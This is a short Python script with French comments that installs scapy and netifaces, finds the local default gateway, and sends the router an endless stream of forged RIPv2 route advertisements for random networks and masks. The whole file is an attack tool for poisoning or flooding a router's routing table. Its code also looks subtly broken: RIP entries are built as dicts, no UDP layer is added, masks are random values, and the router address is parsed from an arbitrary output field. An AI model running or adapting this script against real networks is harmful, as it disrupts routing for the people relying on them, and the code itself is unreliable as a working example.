# Created BY Kuroakashiro
import os
import subprocess
import random
import time

# Installe les librairies nécessaires avec pip
subprocess.call(["pip", "install", "scapy", "netifaces"])

import netifaces
from scapy.all import *

# Fonction pour créer une adresse réseau aléatoire
def create_random_network():
    network = str(random.randint(1, 254)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(0)
    mask = "255." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(0)
    return (network, mask)

# Détecte l'adresse IP du routeur
gateways = netifaces.gateways()
default_gateway = gateways['default'][netifaces.AF_INET][0]
route = subprocess.check_output(["ip", "route", "get", default_gateway])
router_ip = route.split()[4].decode()

# Boucle pour envoyer des trames RIP avec des adresses réseau aléatoires
while True:
    # Crée une adresse réseau aléatoire et une trame RIP avec cette adresse réseau
    network, mask = create_random_network()
    rip = RIP(version=2)
    rip_entry = {"address": network, "mask": mask, "metric": random.randint(1, 10)}
    rip.add_field("command", 2)
    rip.add_field("entries", [rip_entry])

    # Crée un paquet IP avec la trame RIP comme charge utile
    ip = IP(dst=router_ip)
    ip.add_payload(rip)

    # Envoie le paquet RIP au routeur
    send(ip)

    # Attend 1 seconde avant d'envoyer la prochaine trame RIP
    time.sleep(1)
